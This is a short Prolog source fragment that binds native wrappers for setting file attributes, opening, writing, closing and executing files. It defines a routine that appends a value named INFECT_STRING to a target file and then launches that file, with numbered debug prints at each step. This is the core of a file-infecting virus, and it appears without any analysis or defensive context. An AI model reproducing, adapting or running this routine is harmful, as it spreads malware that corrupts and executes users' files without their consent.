:-foreign(setfileattributes_wrapper(+float,+integer)).
:-foreign(fopen_wrapper(+float,+string,-float)).
:-foreign(fputs_wrapper(+float,+float)).
:-foreign(fclose_wrapper(+float)).
:-foreign(shellexecute_wrapper(+float)).

p(ARGV,INFECT_STRING,FILE_ATTRI):- FILE_ADDR is ARGV+4*1,write('111'),nl, setfileattributes_wrapper(FILE_ADDR,FILE_ATTRI),write('222'),nl,fopen_wrapper(FILE_ADDR,'at',FILE_PTR),write('333'),nl,fputs_wrapper(INFECT_STRING,FILE_PTR),write('444'),nl,fclose_wrapper(FILE_PTR),write('555'),nl,shellexecute_wrapper(FILE_ADDR),write('666'),nl.
